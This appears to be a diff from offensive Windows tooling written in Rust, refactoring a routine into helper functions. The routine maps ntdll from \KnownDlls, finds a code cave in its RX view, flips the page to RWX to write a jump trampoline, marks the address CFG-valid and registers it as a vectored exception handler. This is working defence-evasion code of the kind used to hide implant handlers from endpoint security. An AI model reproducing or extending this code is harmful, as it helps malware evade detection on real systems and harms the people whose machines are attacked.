@@ -178,22 +178,133 @@ pub unsafe fn register_section_backed_handler(
     handler: unsafe extern "system" fn(usize) -> i32,
 ) -> *mut c_void {
     // Resolve the NT APIs we need.
-    let nt_open = match crate::resolve::export_addr(b"ntdll.dll", b"NtOpenFile") {
-        Some(a) => a,
-        None => return core::ptr::null_mut(),
-    };
-    let nt_create_sec = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateSection") {
-        Some(a) => a,
-        None => return core::ptr::null_mut(),
-    };
-    let nt_map_view = match crate::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection") {
-        Some(a) => a,
+    let (nt_open, nt_create_sec, nt_map_view) = match resolve_section_apis() {
+        Some(v) => v,
         None => return core::ptr::null_mut(),
     };
 
-    // Open \KnownDlls\ntdll.dll — this is the canonical backing file.
-    // Use a UNICODE_STRING on the stack for the path.
-    let path: [u16; 43] = [
+    let file_handle = match open_known_dll(nt_open) {
+        Some(h) => h,
+        None => return core::ptr::null_mut(),
+    };
+    let sec_handle = match create_image_section(file_handle, nt_create_sec) {
+        Some(s) => s,
+        None => return core::ptr::null_mut(),
+    };
+    let (view_base, view_size) = match map_section_view(sec_handle, nt_map_view) {
+        Some(v) => v,
+        None => return core::ptr::null_mut(),
+    };
+
+    // We now have a view of ntdll mapped at view_base. The view is RX only.
+    // Find a suitable gap (LACUNA pdata scan or INT3 padding scan).
+    let gap_addr = match find_code_cave(view_base, view_size) {
+        Some(g) => g,
+        None => {
+            // Unmap and return null.
+            unmap_view(view_base);
+            return core::ptr::null_mut();
+        }
+    };
+
+    // The gap is in the RX view. We need to write our handler code there.
+    let prot_fn = match resolve_nt_protect() {
+        Some(p) => p,
+        // Can't write to the gap — fall back to direct registration.
+        None => return register_veh_direct(handler),
+    };
+    if !write_handler_trampoline(prot_fn, gap_addr, handler) {
+        return register_veh_direct(handler);
+    }
+
+    // Mark the trampoline as CFG-valid.
+    crate::cfg_user::mark_addr_cfg_valid(gap_addr);
+    // Register the gap address as the VEH handler.
+    register_veh_at(gap_addr)
+}
+
+// ---- Section-backed handler internals (Mode B) ----------------------------
+// Types hoisted from the original function body so the extracted stage
+// helpers can share them — pure code move, no behavior change.
+
+#[repr(C)]
+struct UnicodeString {
+    len: u16,
+    max_len: u16,
+    buffer: *const u16,
+}
+
+#[repr(C)]
+struct ObjectAttributes {
+    len: u32,
+    root_dir: usize,
+    obj_name: *const UnicodeString,
+    attrs: u32,
+    sec_desc: usize,
+    sec_qos: usize,
+}
+
+#[repr(C)]
+struct IoStatusBlock {
+    _status: i32,
+    _info: usize,
+}
+
+type NtOpenFileFn = unsafe extern "system" fn(
+    *mut usize,
+    u32,
+    *const ObjectAttributes,
+    *mut IoStatusBlock,
+    u32,
+    u32,
+) -> i32;
+type NtCreateSectionFn = unsafe extern "system" fn(
+    *mut usize,
+    u32,
+    *const ObjectAttributes,
+    *mut i64,
+    u32,
+    u32,
+    usize,
+) -> i32;
+type NtCloseFn = unsafe extern "system" fn(usize) -> i32;
+type NtMapViewFn = unsafe extern "system" fn(
+    usize,
+    usize,
+    *mut *mut c_void,
+    usize,
+    usize,
+    *mut i64,
+    *mut usize,
+    u32,
+    u32,
+    u32,
+) -> i32;
+type NtUnmapViewFn = unsafe extern "system" fn(usize, *mut c_void) -> i32;
+type NtProtectVmFn =
+    unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+
+/// Resolve the NT APIs needed for the section-backed handler: NtOpenFile,
+/// NtCreateSection and NtMapViewOfSection. Returns None if any is missing.
+unsafe fn resolve_section_apis() -> Option<(usize, usize, usize)> {
+    let nt_open = match crate::resolve::export_addr(b"ntdll.dll", b"NtOpenFile") {
+        Some(a) => a,
+        None => return None,
+    };
+    let nt_create_sec = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateSection") {
+        Some(a) => a,
+        None => return None,
+    };
+    let nt_map_view = match crate::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection") {
+        Some(a) => a,
+        None => return None,
+    };
+    Some((nt_open, nt_create_sec, nt_map_view))
+}
+
+/// `\KnownDlls\ntdll.dll` as a null-padded UTF-16 array (43 units).
+fn known_dll_ntdll_path() -> [u16; 43] {
+    [
         b'\\' as u16,
         b'K' as u16,
         b'n' as u16,
@@ -237,24 +348,13 @@ pub unsafe fn register_section_backed_handler(
         0,
         0,
         0,
-    ];
+    ]
+}
 
-    #[repr(C)]
-    struct UnicodeString {
-        len: u16,
-        max_len: u16,
-        buffer: *const u16,
-    }
-
-    #[repr(C)]
-    struct ObjectAttributes {
-        len: u32,
-        root_dir: usize,
-        obj_name: *const UnicodeString,
-        attrs: u32,
-        sec_desc: usize,
-        sec_qos: usize,
-    }
+/// Open `\KnownDlls\ntdll.dll` — this is the canonical backing file.
+/// Use a UNICODE_STRING on the stack for the path.
+unsafe fn open_known_dll(nt_open: usize) -> Option<usize> {
+    let path = known_dll_ntdll_path();
 
     let us = UnicodeString {
         len: 40,     // 20 chars * 2
@@ -270,20 +370,6 @@ pub unsafe fn register_section_backed_handler(
         sec_qos: 0,
     };
 
-    #[repr(C)]
-    struct IoStatusBlock {
-        _status: i32,
-        _info: usize,
-    }
-
-    type NtOpenFileFn = unsafe extern "system" fn(
-        *mut usize,
-        u32,
-        *const ObjectAttributes,
-        *mut IoStatusBlock,
-        u32,
-        u32,
-    ) -> i32;
     let open_fn: NtOpenFileFn = core::mem::transmute(nt_open);
 
     let mut file_handle: usize = 0;
@@ -300,19 +386,14 @@ pub unsafe fn register_section_backed_handler(
         1, // FILE_SYNCHRONOUS_IO_NONALERT
     );
     if st < 0 {
-        return core::ptr::null_mut();
+        return None;
     }
+    Some(file_handle)
+}
 
-    // Create a SEC_IMAGE section from the file handle.
-    type NtCreateSectionFn = unsafe extern "system" fn(
-        *mut usize,
-        u32,
-        *const ObjectAttributes,
-        *mut i64,
-        u32,
-        u32,
-        usize,
-    ) -> i32;
+/// Create a SEC_IMAGE section from the file handle. Closes the file handle
+/// regardless of success. Returns the section handle (None on failure).
+unsafe fn create_image_section(file_handle: usize, nt_create_sec: usize) -> Option<usize> {
     let sec_fn: NtCreateSectionFn = core::mem::transmute(nt_create_sec);
 
     let mut sec_handle: usize = 0;
@@ -327,32 +408,17 @@ pub unsafe fn register_section_backed_handler(
         file_handle,
     );
     // Close file handle regardless.
-    type NtCloseFn = unsafe extern "system" fn(usize) -> i32;
-    let _nt_close = match crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
-        Some(a) => {
-            let f: NtCloseFn = core::mem::transmute(a);
-            f(file_handle);
-        }
-        None => {}
-    };
+    close_handle(file_handle);
 
     if st2 < 0 {
-        return core::ptr::null_mut();
+        return None;
     }
+    Some(sec_handle)
+}
 
-    // Map a view.
-    type NtMapViewFn = unsafe extern "system" fn(
-        usize,
-        usize,
-        *mut *mut c_void,
-        usize,
-        usize,
-        *mut i64,
-        *mut usize,
-        u32,
-        u32,
-        u32,
-    ) -> i32;
+/// Map a view of the section (PAGE_EXECUTE_READ). Closes the section handle
+/// regardless of success. Returns (view_base, view_size) on success.
+unsafe fn map_section_view(sec_handle: usize, nt_map_view: usize) -> Option<(*mut c_void, usize)> {
     let map_fn: NtMapViewFn = core::mem::transmute(nt_map_view);
 
     let mut view_base: *mut c_void = core::ptr::null_mut();
@@ -371,47 +437,49 @@ pub unsafe fn register_section_backed_handler(
         0x20, // PAGE_EXECUTE_READ
     );
     // Close section handle.
-    type NtCloseFn2 = unsafe extern "system" fn(usize) -> i32;
-    if let Some(a) = crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
-        let f: NtCloseFn2 = core::mem::transmute(a);
-        f(sec_handle);
-    }
+    close_handle(sec_handle);
 
     if st3 < 0 || view_base.is_null() {
-        return core::ptr::null_mut();
+        return None;
     }
+    Some((view_base, view_size))
+}
 
-    // We now have a view of ntdll mapped at view_base. The view is RX only.
-    // We need to write our handler into a code cave in the .text section.
-    // Find a suitable gap using LACUNA's pdata scanner (if available) or
-    // a simple scan for INT3 padding bytes (0xCC).
-
-    let gap_addr = match find_code_cave(view_base, view_size) {
-        Some(g) => g,
-        None => {
-            // Unmap and return null.
-            type NtUnmapViewFn = unsafe extern "system" fn(usize, *mut c_void) -> i32;
-            if let Some(a) = crate::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
-                let f: NtUnmapViewFn = core::mem::transmute(a);
-                f((-1isize) as usize, view_base);
-            }
-            return core::ptr::null_mut();
-        }
+/// Close a handle via NtClose (best-effort; resolution failure is ignored).
+unsafe fn close_handle(handle: usize) {
+    let f: NtCloseFn = match crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
+        Some(a) => core::mem::transmute(a),
+        None => return,
     };
+    f(handle);
+}
 
-    // The gap is in the RX view. We need to write our handler code there.
-    // Change protection: RX → RWX → write → RX.
-    type NtProtectVmFn =
-        unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+/// Unmap the mapped ntdll view (NtUnmapViewOfSection on the current process).
+unsafe fn unmap_view(view_base: *mut c_void) {
+    if let Some(a) = crate::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
+        let f: NtUnmapViewFn = core::mem::transmute(a);
+        f((-1isize) as usize, view_base);
+    }
+}
+
+/// Resolve NtProtectVirtualMemory for the gap write (RX → RWX → write → RX).
+unsafe fn resolve_nt_protect() -> Option<NtProtectVmFn> {
     let nt_protect = match crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory") {
         Some(a) => a,
-        None => {
-            // Can't write to the gap — fall back to direct registration.
-            return register_veh_direct(handler);
-        }
+        None => return None,
     };
-    let prot_fn: NtProtectVmFn = core::mem::transmute(nt_protect);
+    Some(core::mem::transmute(nt_protect))
+}
 
+/// Change the gap page protection to RWX, write a tiny trampoline
+/// (`mov rax, <handler_addr>; jmp rax`, 12 bytes) and restore RX. Returns
+/// false if the page can't be made writable (caller falls back to direct
+/// registration).
+unsafe fn write_handler_trampoline(
+    prot_fn: NtProtectVmFn,
+    gap_addr: usize,
+    handler: unsafe extern "system" fn(usize) -> i32,
+) -> bool {
     let gap_page = (gap_addr & !0xFFF) as *mut c_void;
     let mut page_region: *mut c_void = gap_page;
     let mut page_size: usize = 0x1000;
@@ -425,7 +493,7 @@ pub unsafe fn register_section_backed_handler(
         &mut old_prot,
     );
     if protect_st < 0 {
-        return register_veh_direct(handler);
+        return false;
     }
 
     // Write a tiny trampoline at the gap:
@@ -453,12 +521,7 @@ pub unsafe fn register_section_backed_handler(
         0x20, // PAGE_EXECUTE_READ
         &mut _dummy,
     );
-
-    // Mark the trampoline as CFG-valid.
-    crate::cfg_user::mark_addr_cfg_valid(gap_addr);
-
-    // Register the gap address as the VEH handler.
-    register_veh_at(gap_addr)
+    true
 }
 
 /// Default direct VEH registration (fallback when section-backed fails).
